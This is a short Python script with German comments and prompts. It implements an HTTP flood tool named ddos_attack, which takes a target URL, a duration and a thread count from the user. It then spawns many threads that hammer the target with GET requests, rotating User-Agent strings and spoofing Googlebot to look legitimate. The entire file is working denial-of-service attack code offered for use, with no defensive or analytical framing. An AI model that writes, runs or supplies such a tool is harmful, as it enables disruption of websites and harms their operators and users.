import threading
import requests
import time
import random

# User-Agents für Realismus
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
]

def ddos_attack():
    target = input("🎯 Ziel-URL (mit http://): ")
    duration = int(input("⏱️ Dauer (Sekunden): "))
    threads = int(input("🧵 Threads (50-200): "))
    
    print(f"💣 Starte Angriff auf {target}... (Ctrl+C zum Stoppen)")
    
    requests_count = 0
    
    def attack():
        nonlocal requests_count
        while time.time() < start_time + duration:
            try:
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept-Language": "en-US,en;q=0.9"
                }
                requests.get(target, headers=headers, timeout=5)
                requests_count += 1
            except:
                continue
    
    start_time = time.time()
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()
    
    while time.time() < start_time + duration:
        time.sleep(1)
        print(f"📤 Gesendete Anfragen: {requests_count}")
    
    print(f"✅ Angriff beendet. Total Anfragen: {requests_count}")
